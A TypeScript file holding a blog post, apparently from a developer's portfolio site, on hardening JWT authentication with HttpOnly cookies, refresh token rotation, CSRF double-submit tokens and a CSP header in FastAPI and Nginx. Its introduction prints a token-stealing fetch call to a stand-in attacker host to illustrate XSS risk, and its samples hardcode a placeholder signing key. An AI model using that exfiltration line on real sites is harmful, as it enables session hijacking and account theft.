import type { BlogPost } from "../blogs";

export const blog10: BlogPost = {
  id: "blog-10",
  title: "Zero-Trust API Authentication: Mitigating Token Leakage & Session Hijacking",
  slug: "zero-trust-authentication-jwt-security-best-practices",
  date: "April 1, 2026",
  readTime: "12 min read",
  excerpt: "Implement secure authentication workflows with HttpOnly cookies, CSRF protection, and JWT rotation in Python and Node.js.",
  category: "AppSec",
  tags: ["JWT", "Security", "AppSec", "Authentication", "FastAPI", "API Security"],
  metaDescription: "Secure your APIs against session hijacking. Implement JWT token rotation, HttpOnly cookies, and CSRF protection in FastAPI.",
  metaKeywords: "zero trust auth, JWT security, token rotation, HttpOnly cookies, API session hijacking, CSRF protection, security token leakage",
  content: `### Introduction

Where do you store your JSON Web Tokens (JWT) after a user logs into your React website? Many developers default to storing tokens in \`localStorage\` or \`sessionStorage\` because it is easy to write:
\`\`\`javascript
localStorage.setItem(\\"access_token\\", token);
\`\`\`

While this is simple, it introduces a severe security vulnerability: **Cross-Site Scripting (XSS)**. Storing tokens in \`localStorage\` makes them accessible to any JavaScript running on your page. If an attacker injects a malicious script—either through a form input vulnerability or a compromised third-party package—they can read the token using a single line of JavaScript and send it to their server:
\`\`\`javascript
const stolenToken = localStorage.getItem(\\"access_token\\");
fetch(\\"https://hacker-api.com/steal\\", { method: \\"POST\\", body: stolenToken });
\`\`\`

Once the token is stolen, the attacker can hijack the user\\'s session and access their account.

To build secure web applications, we must implement a **Zero-Trust API Authentication Architecture**. In this guide, we will move our session tokens from browser-accessible storage to secure **HttpOnly cookies**, implement **Refresh Token Rotation (RTR)** to mitigate token leakage, and configure **CSRF protections** to shield our API endpoints.

---

### Token Lifetime and Rotation Lifecycle

To prevent session hijacking, we split our session management into short-lived access tokens and long-lived refresh tokens. These tokens are stored in secure cookies and rotated during use:

\`\`\`
[ React Client ] ────> [ API: /api/v1/auth/login ] ────> [ Validate Credentials ]
                                                              │
[ Set HttpOnly Cookies ] <────────────────────────────────────┘
 (Access & Refresh)
        │
        ▼ (Access Token Expires)
[ API: /api/v1/auth/refresh ] ──> [ Check Blacklist ]
                                         │
                                         ├──> [ Old Token Blacklisted? ] ──> [ Revoke All Sessions ]
                                         │
                                         └──> [ Valid Token? ] ──> [ Rotate & Issue New Cookies ]
\`\`\`

When a user logs in, the server generates an access token (valid for 15 minutes) and a refresh token (valid for 7 days), returning both inside HttpOnly cookies. When the access token expires, the client calls the refresh endpoint. The server validates the refresh token, blacklists the old refresh token, and returns a new pair of rotated tokens.

---

### Step 1: Setting Secure Cookies in FastAPI

To prevent JavaScript from accessing authentication tokens, set them inside cookies configured with the following flags:
*   \`httponly=True\`: Prevents browser-side JavaScript from reading the cookie, blocking XSS-based theft.
*   \`secure=True\`: Enforces that the cookie is only sent over encrypted HTTPS connections.
*   \`samesite=\\"strict\\"\` or \`samesite=\\"lax\\"\`: Restricts the browser from sending the cookie during cross-origin requests, protecting against CSRF attacks.

Here is a production-grade FastAPI implementation for setting secure cookies during authentication:

\`\`\`python
# filepath: src/auth/cookies.py
from fastapi import FastAPI, Response, HTTPException
from jose import jwt
from datetime import datetime, timedelta

app = FastAPI()
SECRET_KEY = \"SUPER_SECRET_HMAC_KEY_DO_NOT_SHARE\"
ALGORITHM = \"HS256\"

def create_token(data: dict, expires_delta: timedelta) -> str:
    \"\"\"Generates a signed JSON Web Token.\"\"\"
    to_encode = data.copy()
    expire = datetime.utcnow() + expires_delta
    to_encode.update({\"exp\": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

@app.post(\"/api/v1/auth/login\")
async def login(response: Response):
    # (Insert username and password validation logic here)
    user_id = \"user_123\"
    
    # 1. Generate short-lived access token and long-lived refresh token
    access_token = create_token({\"sub\": user_id, \"type\": \"access\"}, timedelta(minutes=15))
    refresh_token = create_token({\"sub\": user_id, \"type\": \"refresh\"}, timedelta(days=7))

    # 2. Set the access token in an HttpOnly cookie
    response.set_cookie(
        key=\"access_token\",
        value=access_token,
        httponly=True,
        secure=True,
        samesite=\"strict\",
        max_age=900,  # 15 minutes
        path=\"/\"
    )
    
    # 3. Set the refresh token in an HttpOnly cookie
    response.set_cookie(
        key=\"refresh_token\",
        value=refresh_token,
        httponly=True,
        secure=True,
        samesite=\"strict\",
        max_age=604800,  # 7 days
        path=\"/api/v1/auth\"  # Restrict scope to the refresh endpoint
    )
    
    return {\"status\": \"success\", \"message\": \"Authentication cookies set successfully\"}
\`\`\`

---

### Step 2: Implementing Refresh Token Rotation (RTR)

While HttpOnly cookies protect tokens from XSS, a refresh token could still be leaked through other channels (e.g., local database backups or log file leakage). If a hacker gains access to a refresh token that is valid for 7 days, they can generate new access tokens.

To mitigate this risk, implement **Refresh Token Rotation (RTR)**. Every time a refresh token is used to request a new access token, the server blacklists the old refresh token and issues a new refresh token.

If the server receives a request with a blacklisted refresh token, it indicates that a replay attack is occurring (either the user or an attacker is reusing a token). In this scenario, the server revokes all sessions associated with that user to protect the account:

\`\`\`python
# filepath: src/auth/rotate.py
from fastapi import FastAPI, Response, HTTPException, Cookie, Depends
from jose import jwt, JWTError

# Mock cache/database for blacklisted tokens
blacklisted_tokens = set()
active_sessions = {\"user_123\": [\"session_active\"]}

async def is_token_blacklisted(token: str) -> bool:
    return token in blacklisted_tokens

async def blacklist_token(token: str):
    blacklisted_tokens.add(token)

async def revoke_all_user_sessions(user_id: str):
    if user_id in active_sessions:
        active_sessions[user_id] = []
        print(f\"Security Alert: Revoked all active sessions for user: {user_id}\")

@app.post(\"/api/v1/auth/refresh\")
async def refresh_tokens(response: Response, refresh_token: str = Cookie(None)):
    if not refresh_token:
        raise HTTPException(status_code=401, detail=\"Refresh session token missing\")
        
    try:
        # Decode and verify the refresh token
        payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=[ALGORITHM])
        user_id = payload.get(\"sub\")
        token_type = payload.get(\"type\")
        
        if token_type != \"refresh\":
            raise HTTPException(status_code=401, detail=\"Invalid token classification\")

        # Check if the token has been blacklisted (indicates a replay attack)
        if await is_token_blacklisted(refresh_token):
            await revoke_all_user_sessions(user_id)
            raise HTTPException(
                status_code=401, 
                detail=\"Replay attack detected. Session hijacked! Access revoked.\"
            )
            
        # Blacklist the current refresh token
        await blacklist_token(refresh_token)
        
        # Generate a new token pair
        new_access = create_token({\"sub\": user_id, \"type\": \"access\"}, timedelta(minutes=15))
        new_refresh = create_token({\"sub\": user_id, \"type\": \"refresh\"}, timedelta(days=7))
        
        # Set new rotated cookies
        response.set_cookie(key=\"access_token\", value=new_access, httponly=True, secure=True, samesite=\"strict\")
        response.set_cookie(
            key=\"refresh_token\", 
            value=new_refresh, 
            httponly=True, 
            secure=True, 
            samesite=\"strict\", 
            path=\"/api/v1/auth\"
        )
        
        return {\"status\": \"success\", \"message\": \"Session tokens rotated successfully\"}
    except JWTError:
        raise HTTPException(status_code=401, detail=\"Session expired or invalid\")
\`\`\`

---

### Step 3: Mitigating CSRF with Double Submit Cookies

Using cookies introduces vulnerability to **Cross-Site Request Forgery (CSRF)**. CSRF occurs when a malicious website tricks a user\\'s browser into sending requests to your API while the user is authenticated. Since the browser automatically attaches cookies to requests matching your domain, the API will execute the unauthorized actions.

While setting \`samesite=\\"strict\\"\` blocks cross-origin cookies in modern browsers, older clients may not support this flag. To ensure protection, implement a **Double Submit Cookie** pattern:
1. Generate a unique, cryptographically secure CSRF token during login.
2. Set this token in a standard, JavaScript-accessible cookie.
3. Require the client application to read this token and include it in a custom request header (e.g., \`X-CSRF-Token\`) for state-changing operations (POST, PUT, DELETE).
4. The backend compares the header value with the cookie value. If they do not match, the request is rejected:

\`\`\`python
# filepath: src/auth/csrf.py
from fastapi import FastAPI, Request, HTTPException, Cookie
import secrets

@app.post(\"/api/v1/auth/login_csrf\")
async def login_with_csrf(response: Response):
    # Set standard auth cookies
    # ... (see Step 1)
    
    # Generate and set CSRF token
    csrf_token = secrets.token_hex(32)
    response.set_cookie(
        key=\"csrf_token\",
        value=csrf_token,
        secure=True,
        samesite=\"strict\",
        max_age=900
    )
    return {\"status\": \"logged in\"}

def verify_csrf_token(request: Request, csrf_token: str = Cookie(None)):
    \"\"\"Validates the CSRF token from headers against the cookie.\"\"\"
    # Safe methods do not require CSRF validation
    if request.method in [\"GET\", \"HEAD\", \"OPTIONS\"]:
        return
        
    header_csrf = request.headers.get(\"X-CSRF-Token\")
    if not header_csrf or not csrf_token or header_csrf != csrf_token:
        raise HTTPException(status_code=403, detail=\"CSRF validation check failed\")
\`\`\`

---

### Step 4: Content Security Policy (CSP) Configuration

To prevent XSS vulnerabilities from bypassing your cookie protections, configure a strict Content Security Policy (CSP) header. This restricts the domains that can execute scripts on your page and disables inline script execution.

Here is an example Nginx configuration that implements a secure CSP header:

\`\`\`nginx
# filepath: config/nginx.conf
add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self' data: https://www.samadshaikh.dev; font-src 'self' https://fonts.gstatic.com; frame-ancestors 'none'; object-src 'none';\" always;
\`\`\`

---

### Reading Recommendations

If you want to apply database-level security policies to protect user records, read **[How I Built PriMaX Hub: Scaling a Multi-Module SaaS on Supabase Architecture](/?blog=how-i-built-primax-hub-supabase-architecture)**.

If you are developing backend microservices to handle concurrent AI workloads, check out our guide on **[Taming Asyncio: Handling 10k+ Concurrent LLM Requests](/?blog=taming-asyncio-tornado-fastapi-concurrency)**.

---

### References & Resources

* OWASP: **[JSON Web Token Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)**
* MDN Web Docs: **[Using HTTP Cookies Securely](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)**
* FastAPI: **[Cookie Parameter Documentation](https://fastapi.tiangolo.com/tutorial/cookie-params/)**
* IETF: **[RFC 7519: JSON Web Token Specifications](https://tools.ietf.org/html/rfc7519)**

---

### Feedback & Collaboration

Where do you store authentication tokens in your projects? Have you implemented refresh token rotation in production before? Let\\'s discuss secure authentication patterns! Leave your feedback on my **[Resume Portal](https://samadshaikh.me)** or write a note in the Connect tab.`
};
